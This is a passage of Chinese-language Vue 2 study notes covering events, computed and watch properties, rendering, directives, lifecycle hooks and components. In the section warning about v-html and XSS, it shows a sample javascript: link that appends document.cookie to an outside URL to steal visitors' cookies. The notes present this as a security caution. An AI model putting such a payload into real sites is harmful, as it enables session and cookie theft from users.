alert(&#39;hell0&#39;)&#125;&#125;)。 绑定事件的时候”@xxx&#x3D;”的后面可以加一些简单的语句，如@click=&quot;istrue = !istrue;x++&quot;。 事件的回调需要配置在methods对象中，最终会在vm上。 注意methods中配置的函数 不要用箭头函数！ 否则this就不是vm了。methods中配置的函数都是被Vue管理的函数，函数里this的指向是vm或组件实例对象。 @click&#x3D;”demo”和@click&#x3D;”demo($event)”效果一致，但后者可以传参。$event表示参数传入了event对象，如果使用前者但定义函数时传入了一个或多个参数，会自动给第一个参数复制为event其它为undefined。 事件修饰符 prevent：阻止默认事件（常用） stop：阻止事件冒泡（常用） once：事件只触发一次（常用） capture：使用事件的捕获模式 self：只有event.target是当前操作的元素时才触发事件 passive：事件的默认行为立即执行，无需等待事件回调执行完毕，移动端使用较多语法形如@click.prevent=&quot;showInfo&quot;。修饰符也可以连续写，@click.prevent.stop=&quot;showInfo&quot;意为先阻止默认行为再阻止冒泡。 键盘事件有@keyup和@keydown，前者更常用。在@keyup=&quot;showInfo&quot;中的函数showInfo里使用e.target.value或e.key可以获取按下的健名，使用e.keyCode可以获取按键的编码。通过语法@keyup.enter使用按键别名，事件在具有该别名的按键抬起时才会触发。 Vue提供的常用的按键别名：回车——enter，删除——delete（捕获“删除”和“退格”键），退出——esc，空格——space，换行——tab，上——up，下——down，左——left，右——right。 注意tab键本身有切换光标焦点的功能，使用 @keyup.tab达不到预期的效果，tab必须用keydown使用。 Vue未提供别名的按键可以使用按键原始的key值绑定（通过e.key获取），但注意要转为kebab-case（短横线命名，如e.key获取到的名字是CapsLock，需要写为caps-lock。） 系统修饰键（用法特殊）：ctrl、alt、shift、meta（win的徽标，mac的command） 配合keyup使用：按下修饰键的同时，再按下其他任意键随后释放该键，事件才被触发。 配合keydown使用：正常触发事件。 也适用于更强的要求，如按下ctrl+a才会触发事件：@keyup.ctrl.a。. （不推荐）可以使用keyCode去指定具体的按键，如@keydown.13。 通过Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名 计算属性何为属性？Vue认为data里的东西就是属性，有属性名和属性值。计算属性就是要用的属性不存在，需要拿已有属性（Vue管理的属性才可以，不能是随便一个变量）去加工&#x2F;计算并生成一个全新的属性。底层原理是借助了Object.defineproperty方法提供的getter和setter。优势是与methods实现相比内部多了一个缓存机制（复用），效率更高且调试方便。计算属性最终会出现在vm上，直接调用即可；且如果计算属性需要被修改（vm.sum&#x3D;’张+三’ ），就必须写set函数响应修改，且set函数中需要引起计算时依赖的数据发生改变。计算属性不能放到data里，而需要放到另一个配置项computed里，并把计算过程放入一个 对象 ： 12345678910111213141516new Vue(&#123; el:&#x27;#root&#x27;, data:&#123;a:3,b:2&#125;, computed:&#123; sum:&#123; get()&#123; return this.a + &#x27;-&#x27; + this.b; &#125;， set(value)&#123; const arr = value.split(&#x27;-&#x27;); this.a = arr[0]; this.b = arr[1]; &#125; &#125; &#125;&#125;) 计算属性对象中get()函数的作用：当有人读取sum时就会被调用，且返回值作为sum的值。get()什么时候调用？1. 初次读取sum的值时。2.所依赖的数据（a或b）发生变化时。set()什么时候调用？sum的值被修改时。 当计算属性确定只有getter而没有setter时即只有读取需求，没修改需求时可以用简写属性。即不用写作配置对象，而是写作函数，此时函数就相当于getter： 123456// 简写属性computed:&#123; sum()&#123; return this.a + &#x27;-&#x27; + this.b; &#125;&#125; 需要注意的是计算属性靠的就是对应属性为名字的函数的返回值，但办不到让它等一等再有返回值。所以计算属性中不能开启异步任务去维护数据！ 而watch可以。 监视监视属性watch：当被监视的属性变化时，回调函数自动调用，进行相关操作。 监视的属性必须存在才能进行监视！ 监视的两种写法：(1) new Vue时传入watch配置 (2) 通过vm.$watch监视 1234567891011121314// 监视属性watch:&#123; // 这里的key名可以使用简写方式，不加引号。对象里的key是字符串。 // 但如果需要监视的属性是xxx.xxx，就需要加引号写作&#x27;xxx.xxx&#x27;的形式。 // 不加引号的前提是属性名必须满足变量取名的要求。 istrue:&#123; // handler:当istrue发生改变时调用 handler(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue) &#125; // 初始化时调用一下handler immediate:true, &#125; &#125; 除了handler配置项，也可以用vm监视，首先要保证实例已经创建完毕。 12345678910vm.$watch(&#x27;istrue&#x27;,&#123; // 注意这里的key名需要加引号.对象里的key是字符串。 // 这个括号里的内容和上面写在watch里的内容一模一样 istrue:&#123; // handler:当istrue发生改变时调用 handler(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue) &#125; // 初始化时调用一下handler immediate:true,&#125;) 至于这两种方式的选择，如果在创建实例时就已经明确需要监视谁，就使用watch属性；如果后续根据用户行为再决定需要监视谁，就调用第二种api方式。 深度监视如果data中有形如下面的‘numbers’数据，那么numbers就相当于是data中的一个key，它的value（a:1,b:1）就是这个key的地址。虽然Vue默认可以监视到data中多级数据内部值的改变，但它提供的watch默认不能。如果想让它可以，则需要利用deep:true属性。 1234567891011121314151617const vm = new Vue(&#123; el:&#x27;#root&#x27;, data:&#123; numbers:&#123; // 比如这个括号内的部分的地址是0x123，顺着0x123可以找到ab并改变它们的值。但只要0x123依然是它们的地址，numbers就会被认为是没有改变。 a:1, b:1 &#125; &#125;， watch:&#123; numbers:&#123; deep:true, handler()&#123; console.log(&#x27;numbers改变了&#x27;) &#125; &#125; &#125;&#125;) 监视属性的简写在配置项里没有deep、immediate等属性，只需要响应者handler时可以使用简写写法。 123456789101112131415watch:&#123; // 正常写法 /* numbers:&#123; istrue:&#123; handler(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue) &#125; &#125; &#125;*/ // 简写写法,写成一个函数，参数照样传 istrue(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue) &#125;&#125; 12345678910111213// 正常写法vm.$watch(&#x27;istrue&#x27;,&#123; istrue:&#123; handler(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue) &#125; &#125;&#125;)// 简写写法：第二个函数不传配置项，而是函数。参数照样传。vm.$watch(&#x27;istrue&#x27;,function(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue)&#125;) computed和watch的区别 computed能完成的功能watch都可以完成 watch能完成的功能computed不一定能完成，比如watch可以进行异步操作 两个重要的原则： 被Vue管理的函数最好写成普通函数，这样this的指向才是vm或组建实例对象 所有不被Vue管理的函数（定时器的回调函数、ajax的回调函数、promise的回调函数等 ），最好写成箭头函数，这样this的指向才是vm或组建实例对象 用监视属性实现异步任务计算属性中不能开启异步任务去维护数据，需要用监视属性。之所以要用箭头函数，是因为定时器虽然是在fullname中开启的，但定时器所指定的回调是不受vue控制的，而是受浏览器的定时器管理模块控制的，最后到点了也是浏览器引擎调用的定时器所指定的回调函数。如果用普通函数，因为定时器的回调函数是JS引擎调的，而且它调的时候this已经指定好了，就是window；如果用箭头函数，也是JS引擎调的这个函数，但由于写成了箭头函数，它就没有了自己的this，就要去往外找（箭头函数本身没有this指向，会向上查找）；往外找就找到了firstName的this。而firstName是Vue所管理的函数，又因为它是普通函数，所以它的this就是vm。 123456789101112watch:&#123; firstName(val)&#123; setTimeout(() =&gt; &#123; // 测试this // condole.log(this) this.fullname = val + &#x27;-&#x27; + this.lastName &#125;,1000); &#125;, lastName(val)&#123; this.fullname = val + &#x27;-&#x27; + this.lastName &#125;&#125; class与style绑定 class样式：写法为:class=&quot;xxx&quot;，xxx可以是字符串、对象、数组。 style样式：:style=&quot;&#123;fontSize:xxx&#125;&quot;，其中xxx是动态值；:style=&quot;[a,b]&quot;，其中a、b是样式对象。（样式对象的特点就是样式对象中的属性名都不能瞎写，得是存在的css属性。下面例子4、5中的对象就是样式对象。） 绑定class样式–字符串写法，适用于：样式的类名不确定，需要动态指定。比如下面的例子，已知必须要从mood里读东西，但读的是什么不确定。12345678910111213141516171819&lt;body&gt; &lt;div id = &quot;root&quot;&gt; &lt;div class=&quot;basic&quot; :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;Hello&lt;/div&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; new Vue(&#123; el:&#x27;#root&#x27;, data:&#123; mood:&#x27;normal&#x27; &#125;, methods:&#123; changeMood()&#123; this.mood = &#x27;happy&#x27; &#125; &#125; &#125;) &lt;/script&gt;&lt;/body&gt; 绑定class样式–数组写法，适用于：要绑定的样式个数不确定，名字也不确定。把一个数组传给v-bind:class，这样可以应用一个class列表：1&lt;div class=&quot;basic&quot; :class=&quot;classArr&quot;&gt;Hello&lt;/div&gt; 1data:&#123;classArr:[&#x27;myclass1&#x27;,&#x27;myclass2&#x27;,&#x27;myclass3&#x27;]&#125;, 绑定class样式–对象写法 ，适用于：要绑定的样式个数确定，名字也确定，但要动态决定用不用。1&lt;div class=&quot;basic&quot; :class=&quot;classObj&quot;&gt;Hello&lt;/div&gt; 123456data:&#123; classObj:&#123; myclass1:ture, myclass2:false &#125;&#125;, 也可以写为：1&lt;div class=&quot;basic&quot; :class=&quot;&#123;myclass1:a,myclass2:b&#125;&quot;&gt;Hello&lt;/div&gt; 1data:&#123;a:ture,b:false&#125;, 绑定style样式–对象写法1&lt;div class=&quot;basic&quot; :style=&quot;&#123;fontsize: fsize+&#x27;px&#x27;&#125;&quot;&gt;Hello&lt;/div&gt; 1data:&#123;fsize:40&#125;, 可以更直观地写为：1&lt;div class=&quot;basic&quot; :style=&quot;styleObj&quot;&gt;Hello&lt;/div&gt; 123data:&#123; styleObj:&#123; fontsize:&#x27;40px&#x27;,color:&#x27;red&#x27; &#125;&#125;, 绑定style样式–数组写法 1&lt;div class=&quot;basic&quot; :style=&quot;styleArr&quot;&gt;Hello&lt;/div&gt; 123456data:&#123; styleArr:[ &#123; fontsize:&#x27;40px&#x27;,color:&#x27;red&#x27;,&#125;, &#123; backgroundcolor:&#x27;orange&#x27;&#125; ] &#125; 这种写法不如：1&lt;div class=&quot;basic&quot; :style=&quot;[styleObj1,styleObj2]&quot;&gt;Hello&lt;/div&gt; 12345678data:&#123; styleObj1:&#123; fontsize:&#x27;40px&#x27;,color:&#x27;red&#x27;, &#125;, styleObj2:&#123; backgroundcolor:&#x27;orange&#x27; &#125;,&#125;, 条件渲染 v-if：适用于切换频率较低的场景。特点：不展示的DOM元素直接被移除。注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能被“打断”。其含义类似于if if if和if else-if else。 v-if &#x3D; “表达式” v-else-if &#x3D; “表达式” v-else &#x3D; “表达式” v-show：适用于切换频率较高的场景。指令v-show=的等号后面是true或false，但也可以写一个表达式，根据表达式的值为真或假来给v-show赋值。也可以写v-show=&quot;a&quot;，这会让Vue去下面的data中找a，可以通过调整a实现动态的调整。特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉。其底层实现是通过调整display:none。 使用v-if时元素可能无法获取到，而使用v-show一定可以获取到。 需要注意的是， template只能配合v-if，不能配合v-show。 列表渲染 v-for：加在谁身上就通过遍历的方式生成谁。（有一堆谁就给谁加v-for） 用于展示列表数据 语法：v-for=&quot;(item，index) in xxx&quot; :key=&quot;yyy&quot;（in可以用of代替）（注意key是唯一的） 可遍历数组(p,index)、对象(value,key)、字符串(char,index)（用的很少，value是每个单个字符）、指定次数(number,index)（非常少见 ，） 形参可以有不止一个，默认第一个是每一项内容（value），第二个是索引（index，如果遍历数组就是从0开始的数字；遍历对象就是每一个属性名；遍历字符串也是从0开始的数字）。使用多个形参最好用小括号括起来。 只要用了遍历（v-for）方式去生成多个同样结构的数据，就必须给每个结构作一个唯一标识，:key就是它们的标识。 123456789101112131415161718192021222324&lt;body&gt; &lt;div id=&quot;root&quot;&gt; &lt;ul&gt; &lt;!-- 下面的p是一个形参，这个形参可以直接在li标签体里面使用。 --&gt; &lt;!-- 传递多个形参： --&gt; &lt;!-- &lt;li v-for=&quot;(p,index) in persons&quot; :key=&quot;index&quot;&gt; --&gt; &lt;li v-for=&quot;p in persons&quot; :key=&quot;p.id&quot;&gt; &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125; &lt;/li&gt; &lt;ul&gt; &lt;div&gt; &lt;script&gt; new Vue(&#123; el:&#x27;#root&#x27;, data:&#123; persons:[ // 每个人都应该有唯一的标识：id，一个人的各种信息应该封装在一个对象中 &#123;id:&#x27;001&#x27;,name:&#x27;张三&#x27;,age:18&#125;, &#123;id:&#x27;002&#x27;,name:&#x27;李四&#x27;,age:19&#125; ] &#125; &#125;) &lt;/script&gt;&lt;/body&gt; 列表过滤方法filter()创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。其中的return是过滤条件，把符合条件的过滤出来。判断一个字符串中是否含有指定字符：使用属性indexOf。它可以判断字符出现的索引位置，没出现则返回-1。不会改变原数组，而是会把结果存储到新的数组中。1.用监视属性watch实现： 123456&lt;input type=&quot;text&quot; placeholder=&quot;请输入关键字&quot; v-model=&quot;keyWord&quot;&gt;&lt;ul&gt; &lt;li v-for=&quot;(p,index) in filPersons&quot; :key=&quot;index&quot;&gt; &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125; &lt;/li&gt;&lt;/ul&gt; 1234567891011121314151617data:&#123; keyWord:&#x27;&#x27;, persons:[ &#123;&#125;,&#123;&#125;,&#123;&#125;, ], filPersons:[], // 用来保管过滤出的数据而不对原数组进行修改&#125;,watch:&#123; keyWord:&#123; immediate:true, // 初始化时让handler调用一下；此时的val是空串，而任何字符串都包含空串，所以所有数据都符合过滤条件。 handler(val)&#123; this.filPersons = this.persons.filter((p)=&gt;&#123; return p.name.indexOf(val) !== -1 &#125;) &#125; &#125;&#125; 2.用计算属性computed实现： 123456789101112131415data:&#123; keyWord:&#x27;&#x27;, persons:[ &#123;&#125;,&#123;&#125;,&#123;&#125;, ], filPersons:[], // 用来保管过滤出的数据而不对原数组进行修改&#125;,computed:&#123; filPersons()&#123; // 只要keyWord变化，filPersons()就会重新执行 return this.persons.filter((p)=&gt;&#123; return p.name.indexOf(this.keyWord) !== -1 &#125; &#125;&#125;, 列表排序key的原理key的作用可以理解为就是给节点做一个标识，相当于人类社会中的身份证号。在原列表的最前面添加一个新的person项，用index作为key，为什么会出错？有问题的流程和id作为key的正确流程如下图所示：如果遍历时根本没有写key，Vue则会自动让index作为key。（面试题）react、vue中的key有什么作用？ 虚拟DOM中key的作用： key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下： 对比规则： 旧虚拟DOM中找到了与新虚拟DOM 相同的key ：1. 若虚拟DOM中内容没变，直接使用之前的真实DOM！（之前的旧虚拟dom中肯定已经转过一次了）2. 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM。 旧虚拟DOM中未找到与新虚拟DOM相同的key：创建新的真实DOM随后渲染到页面。 用index作为key可能会引发的问题： 若对数据进行：逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DOM更新 &#x3D;&#x3D;&gt; 界面效果没问题，但效率低。 如果结构中还包含输入类的DOM：会产生错误DOM更新 &#x3D;&#x3D;&gt; 页面有问题。 开发中如何选择key： 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。 Vue监视数据 Vue会监视data中所有层次的数据。 如何监测对象中的数据？ 通过setter实现监视，且要在newVue时就传入要监测的数据。 对象中后追加的属性，Vue默认不做响应式处理 如需给后添加的属性做响应式，请使用如下API：Vue.set(target,propertyName&#x2F;index,value)或vm.$set(target,propertyName&#x2F;index,value) 如何监测数组中的数据？ 通过包裹数组更新元素的方法实现，本质是做了两件事： 调用原生对应的方法对数组进行更新 重新解析模版进而更新页面 在Vue修改数组中的某个元素一定要用如下方法： 使用这些API：push()、pop()、shift()、unshift()、splice()、sort()、reverse() Vue.set() 或 vm.$set() 特别注意：Vue.set() 和 vm.$set()不能给vm或vm的数据对象添加属性！！！ 收集表单数据 若&lt;input type=&quot;text&quot;/&gt;，则v-model收集的是value值，用户输入的就是value值。 若&lt;input type=&quot;radio&quot;/&gt;，则v-model收集的是value值，且要给标签配置value值。 若&lt;input type=&quot;checkbox&quot;/&gt; 没有配置input的value属性，那么收集的就是checked（勾选&#x2F;未勾选，是boolean） 配置input的value属性： （1）v-model的初始值是非数组，那么收集的就是checked（勾选&#x2F;未勾选，是boolean） （2）v-model的初始值是数组，那么收集的就是value组成的数组 v-model的三个修饰符：lazy：失去焦点再收集数据；number：输入字符串转为有效的数字；trim：输入首尾空格过滤通过 JSON.stringify() 把 JavaScript 对象转换为字符串。 过渡&amp;动画过滤器定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）语法：1.注册过滤器：全局过滤器Vue.filter(name,callback) 或 局部过滤器new Vue&#123;filters:&#123;&#125;&#125;2.使用过滤器：&#123;&#123; xxx | 过滤器名&#125;&#125; 或 v-bind:属性 = ”xxx｜过滤器名“ 过滤器也可以接收额外参数，如 1&lt;h3&gt; 现在是：&#123;&#123;time | timeFormater(&#x27;YYYY_MM_DD&#x27;)&#125;&#125;&lt;/h3&gt; 123timeFormater(value,str=&#x27;YYYY年MM月DD日&#x27; HH：mm：ss&#x27;)&#123; return dayjs(value).format(str)&#125; 多个过滤器可以串联；而且过滤器并没有改变原本的数据，只是产生新的对应的数据。 内置指令与自定义指令内置指令（一）v-bind：单向绑定解析表达式，可简写为:xxxv-model：双向数据绑定v-for：遍历数组&#x2F;对象&#x2F;字符串v-on：绑定事件监听，可简写为@v-if：条件渲染（动态控制节点是否存在）v-else：条件渲染（动态控制节点是否存在）v-show：条件渲染（动态控制节点是否展示） （二）v-text：向其所在的节点中渲染文本内容。与插值语法&#123;&#123;xx&#125;&#125;的区别在于v-text会替换掉节点中的内容，&#123;&#123;xx&#125;&#125;则不会。 v-html：向指定节点中渲染包含html结构的内容。与插值语法&#123;&#123;xx&#125;&#125;的区别在于v-html会替换掉节点中 所有 的内容，&#123;&#123;xx&#125;&#125;则不会；且v-html可以识别html结构。**特别注意：v-html有安全性问题！1.在网站上动态渲染任意html都是非常危险的，容易导致xss攻击；2.一定要在可信的内容上使用v-html，永远不要在用户提交的内容上使用！**比如非法拿取cookie等操作。cookie简略图示如下：在浏览器中的Application&#x2F;储存空间&#x2F;存储中可以查看cookie，右键条目可以进行添加删除等操作。Chrome的插件”Cookie-Editor”可以让对cookie的操作更加方便。在html文件中，如果使用了v-html，进行下列操作就可以简单的拿到其他浏览器的cookie： 123&lt;div id=&quot;root&quot;&gt; &lt;div v-html=&quot;str&quot;&gt;&lt;/div&gt;&lt;/div&gt; 123456new Vue&#123; el:&#x27;#root&#x27;, data:&#123; str:&#x27;&lt;a href=javascript:location.href=&quot;http://www.baidu.com?&quot;+document.cookie&gt;快点击我！你的cookie要被拿走啦！&#x27; &#125;&#125; v-cloak（没有值）：本质上是一个特殊属性，Vue实例创建完毕并接管容器后会删掉v-cloak属性。使用css配合v-cloak可以解决网速慢时页面展示出的问题。 v-once（没有值）（只会执行一次）：v-once所在节点在初次被动态渲染后就视为静态内容了。以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。 v-pre：跳过其所在节点的编译过程。可利用它跳过没有使用指令语法、没有使用插值语法的节点，会加快编译。 自定义指令 定义语法 1.局部指令： 1234567new Vue(&#123;directives:&#123;指令名：配置对象&#125;&#125;)// 或new Vue(&#123;directives:&#123;指令名：回调函数&#125;&#125;) 2.全局指令：Vue.directive&#123;指令名,配置对象&#125; 或 Vue.directive&#123;指令名,回调函数&#125; 配置对象中常用的3个回调： .bind：指令与元素成功绑定时调用。 .inserted：指令所在元素被插入页面时调用。（比如获取焦点就在此处） .update：指令所在模版结构被重新解析时调用。 注意： 指令定义时不加v-，但使用时要加v-； 指令名如果是多个单词，要使用kebab-case命名方式，不要使用camelCase命名。 如果不使用回调，指令会在两种时刻执行：1.指令与元素成功绑定时（一上来） 2.指令所在的模板被重新解析时。 插件用于增强Vue。本质是包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。 定义插件： 1234567891011121314对象.install = function(Vue,options)&#123; // 1. 添加全局过滤器 Vue.filter(....) // 2. 添加全局指令 Vue.directive(....) // 3. 配置全局混入（混合） Vue.mixin(....) // 4. 添加实例方法 Vue.prototype.$myMethod = function()&#123;...&#125; Vue.prototype.$myProperty = xxxx&#125; 使用插件：Vue.use() 自定义插件生命周期 在 http://www.atguigu.com/wp-content/uploads/2020/01/web20-1-2-2.png 查看生命周期图示。 是Vue在关键时刻帮我们调用的一些特殊名称的函数。生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。生命周期函数中的this指向是vm 或 组建实例对象。生命周期函数写在与methods配置项同级的地方。 除了路由相关的那三个，一共有4对（8个）生命周期钩子。将要创建（数据监测、数据代理的创建）——beforeCreate()创建完毕——created()将要挂载——beforeMount()挂载完毕——mounted()将要更新——beforeUpdate()更新完毕——updated()将要销毁——beforeDestroy()销毁完毕——destroyed() 挂载流程上面的第一张图即为挂载流程。 更新流程 销毁流程关于销毁Vue实例：1.销毁后借助vue开发者工具看不到任何信息。2.销毁后 自定义 事件会失效，但 原生 DOM事件依然有效。3.一般不会在beforeDextroy操作数据，因为即使操作数据也不会再触发更新流程了。 常用的生命周期钩子 mounted：Vue完成模板的解析并把 初始的真实DOM元素 放入页面（挂载完毕）后调用。在vm的工作过程中mounted只会被调用一次。 用于发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。 beforeDestroy：当vm.$destroy()调用时调用此生命周期函数（虽然很少调，让张三自鲨不太好）。此时，vm中所有的data、methods、指令等都处于可用状态，马上要执行销毁过程。但 此时对数据的修改不会再触发更新。 用于清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。 Vue组件化模块：向外提供特定功能的js程序，一般就是一个js文件。由于js文件很多很复杂，模块化可以实现js的复用，简化js的编写，提高js运行效率。当应用中的js都是以模块来编写的，那么这个应用就是一个模块化的应用。 传统方式和组件化方式编写应用可以如下图所示，其中传统方式的左侧HTML文件是第二个需求所用到的： 组件：用来实现 局部 （特定）功能效果的 代码 和 资源 的 集合（html&#x2F;css&#x2F;js&#x2F;image等）。由于一个界面的功能很复杂，组件化可以实现编码的复用，简化项目编码，提高运行效率。当应用中的功能都是以多组件的方式来编写的，那么这个应用就是一个组件化的应用。 单文件组件指一个文件中只包含一个组件，文件和组件一一对应，一个文件就是一个组件(a.vue)；非单文件组件指一个文件中包含有n个组件(a.html)。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;body&gt; &lt;div id=&quot;root&quot;&gt; &lt;!-- 第三步：编写组件标签 --&gt; &lt;xuexiao&gt;&lt;/xuexiao&gt; &lt;hr&gt; &lt;!-- 第三步：编写组件标签 --&gt; &lt;xuesheng&gt;&lt;/xuesheng&gt; &lt;/div&gt; &lt;script&gt; // 第一步：创建school组件 const school = Vue.extend(&#123; name:&#x27;BUT&#x27;, // 如果在此处指定名字，就指定了组件在开发者工具中呈现的名字，注册时不能再更改。 template:` &lt;div&gt; &lt;h2&gt;学校名称:&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt; &lt;h2&gt;学校地址:&#123;&#123;address&#125;&#125;&lt;/h2&gt; &lt;button @click=&quot;showName&quot;&gt;显示学校名&lt;/button&gt; &lt;/div&gt; `, data()&#123; return&#123; schoolName:&#x27;BUT&#x27;, address:&#x27;beijing&#x27; &#125; &#125;, methods:&#123; showName()&#123; alert(this.schoolName) &#125; &#125;, &#125;) // 第一步：创建student组件 const student = Vue.extend(&#123; template:` &lt;div&gt; &lt;h2&gt;学生姓名:&#123;&#123;studentName&#125;&#125;&lt;/h2&gt; &lt;h2&gt;学生年龄:&#123;&#123;age&#125;&#125;&lt;/h2&gt; &lt;/div&gt; `, data()&#123; return&#123; studentName:&#x27;BUT&#x27;, age:&#x27;beijing&#x27; &#125; &#125; &#125;) // 创建vm new Vue(&#123; el:&#x27;#root&#x27;, // 第二步：注册组件 components:&#123; // 局部注册xuexiao和xuesheng;只有#root可以用 xuexiao:school, xuesheng:student &#125; &#125;) new Vue(&#123; el:&#x27;#root2&#x27;, &#125;) // 全局注册组件；#root和#root2都可以用。 Vue.component(&#x27;xuexiao&#x27;,school) &lt;/script&gt;&lt;/body&gt; 使用组件的基本步骤Vue中使用组件的三大步骤：一、定义组件（创建组件）二、注册组件三、使用组件（写组件标签&lt;xuexiao&gt;&lt;/xuexiao&gt;） 如何定义一个组件？ 使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别： el不要写。因为最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。 el只能用在通过new关键字创建的Vue实例上，也就是只有new Vue(&#123;&#125;)里的配置对象中才有资格写el。而组件在创建时不会被写明白它到底为谁服务，“组件就是一块砖，哪里需要哪里搬”。 data必须写成函数。为了避免组件被服用时数据存在引用关系。 使用对象是引用数据，你用我用大家用；而函数返回值相当于复印了一份新的，随便改动却影响不了原文件。每次调用函数的时候返回的都是一个新的对象，不会出现两次调用指向的是同一个地址的情况。 如何注册组件？ 局部注册（推荐）：靠new Vue的时候传入components选项。 components中是一组一组的key-value组合，上面定义组件时起的名字只是组件的临时名字，components里的key值才是真正决定了组件名称的。value则指定了组件位置，填写的是上面定义组件时给它的名字。最好这两处使用同样的名字，这样可以使用简写写法（只写一个）。 全局注册：靠Vue.component(&#39;组件名&#39;,组件) 编写组件标签 &lt;xuexiao&gt;&lt;/xuexiao&gt; 关于组件的命名：一个单词的组件名：推荐首字母大写。也可以全小写。多个单词的组件名：推荐每个单词的首字母大写（CamelCase命名）（必须在脚手架环境）。也可以单词间用短横线“-”连接（kebab-case命名），注意JS语法要求对象里的key如果有-则需要用引号包起来。 注意组件名尽量回避HTML中已有的元素名称，例如h2、H2都不行。 可以使用name配置项指定组件在 开发者工具 中呈现的名字。 关于组件标签第一种写法：&lt;xuexiao&gt;&lt;/xuexiao&gt;第二种写法：&lt;xuexiao/&gt;（自闭合）注意：在不使用脚手架时，&lt;xuexiao/&gt;会导致后续组件不能渲染。 简写：const school = Vue.extend(options)可以简写为const school = options，即直接写配置项。这样在注册组件时还是会调用Vue.extend。 组件的嵌套子组件需要注册在在父组件的内部。需要注意：子组件的定义要在注册之前。 子组件在哪里注册，其结构就在哪里写。在父组件的template:内的最后一行补上&lt;xuesheng&gt;&lt;/xuesheng&gt;即可。 开发中使用app组件管理其它所有组件。一人（vm）之下，万人之上。 123&lt;div id=&quot;root&quot;&gt; &lt;app&gt;&lt;/app&gt;&lt;/div&gt; 12345678910111213141516171819// 定义app组件const app = Vue.extend(&#123; template:` &lt;div&gt; &lt;school&gt;&lt;/school&gt; &lt;students&gt;&lt;/students&gt; &lt;/div&gt; `, components:&#123; school, students, &#125;&#125;)new Vue(&#123; // template:`&lt;app&gt;&lt;/app&gt;` 这里写了的话html的div里就可以是空的了 el:&quot;#root&quot;, components:&#123;app&#125;&#125;) VueComponent组件是可复用的Vue实例，所以它们与new Vue接收相同的选项，例如data、methods、watch、生命周期钩子等。仅有的例外是像el这样 根实例（vm） 特有的选项。关于VueComponent： school 组件本质上是一个名为VueComponent的构造函数 ，且不是程序员定义的，它归根到底是Vue.extend生成的。 组件归根到底就是VueComponent，就是构造函数。 我们只需要写&lt;school/&gt;或&lt;school&gt;&lt;/school&gt;，Vue解析时会帮我们创建school组件的实例对象 。即Vue帮我们执行的new VueComponent(options)。 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！ 比如&lt;xuexiao&gt;和&lt;xuesheng&gt;的VueComponent，虽然打印出来虽然一模一样但它们确实不是同一个。是同一个类new出来的两个对象，它们是不同的实体，只是结构类似而已。每new一次就会开辟一块新的内存。 关于this的指向， 组件配置中，data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是【VueComponent实例对象(vc)】。vc和vm功能一样，都有数据代理、数据监视等。 .new Vue(options)配置中，data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是【Vue实例对象(vm)】。 VueComponent的实例对象，经常被简称vc（也可称之为：组件实例对象。因为组件归根到底就是VueComponent）。 Vue的实例对象则常被简称为vm。 一个重要的内置关系（原型链相关） 关于原型链：显式原型prototype和隐式原型__proto__的区别在于，prototype是构造函数的属性，而__proto__是对象的属性。无论是函数身上的显式原型属性，还是实例身上的隐式原型属性，它们都指向了同一个对象：原型对象。通过显示原型链给原型(或者原型的原型)添加属性，通过隐式原型链获取原型的属性，从自身沿着原型链一直找直到window的原型为空。 实例的隐式原型属性，永远指向自己缔造者的原型对象！ 一个重要的内置关系：** VueComponent.prototype.__proto__ === Vue.prototype。**为什么要有这个关系：让组件实例对象（vc）可以访问到Vue原型上的属性、方法。 从下图可以看出，VueComponent的原型对象（VueComponent.prototype）的原型对象（VueComponent.prototype.__proto__），就是Vue的原型对象（Vue.prototype）。 单文件组件（xxx.vue) vscode不认.vue文件，需要安装插件。（如vetur）如果已经安装插件vetur，在.vue文件中输入&lt;v再回车即可生成一套模板。 给.vue文件的起名规则和组件名的那套规则一样（单个单词、多个单词）。下面是文件 School.vue 的示例： 12345678910111213141516171819202122232425262728293031323334&lt;template&gt;&lt;!-- 组件的结构 --&gt;&lt;!-- template内必须有一个根标签&lt;div&gt; --&gt; &lt;div class=&quot;demo&quot;&gt; &lt;h2&gt;学校名称:&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt; &lt;h2&gt;学校地址:&#123;&#123;address&#125;&#125;&lt;/h2&gt; &lt;button @click=&quot;showName&quot;&gt;显示学校名&lt;/button&gt; 